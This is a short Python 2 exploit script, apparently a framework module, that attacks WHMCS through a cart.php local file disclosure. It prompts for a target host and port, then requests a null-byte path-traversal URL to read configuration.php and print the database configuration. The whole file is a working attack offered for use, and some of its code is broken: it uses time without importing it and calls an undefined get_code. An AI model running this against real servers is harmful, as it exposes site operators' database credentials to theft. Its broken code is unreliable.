# whmcs.py
# description: Gets the database config if it is vulnerable to WHMCS cart.php Local File Disclosure
# author: @shipcod3
# reference: http://packetstormsecurity.com/files/106602/whmcs3x-disclose.txt

import sys, re, string

from urllib import urlopen

code_regexp = re.compile("<\?php.+\?>",re.DOTALL)

class whmcs:

    def run(self):
        print 'Set RHOST:',
        rhost = raw_input()
        print 'Set RPORT:',
        rport = raw_input()
        print ""
        print "[*] Executing exploit WHMCS..."
        print ""
        time.sleep(3)

        base = rhost
        
        if rport == '80':
            vulne = "http://{}/cart.php?a=account&templatefile=../../../configuration.php%00".format(base)
            print("[****] Launching exploit on port 80 (http)  >>  {}".format(vulne))

            f = urlopen(vulne)
            code = get_code(f.read())
            print("\n".join(code))
            
        elif rport == '443':
            vulne = "https://{}/cart.php?a=account&templatefile=../../../configuration.php%00".format(base)
            print ("[****] Launching exploit on port 443 (https) >>  {}".format(vulne))

            f = urlopen(vulne)
            code = get_code(f.read())
            print ("\n".join(code))
        
        else:
            print ('[!] Error: No port has been specified')

        print'[#] Done!!!'
        print ""

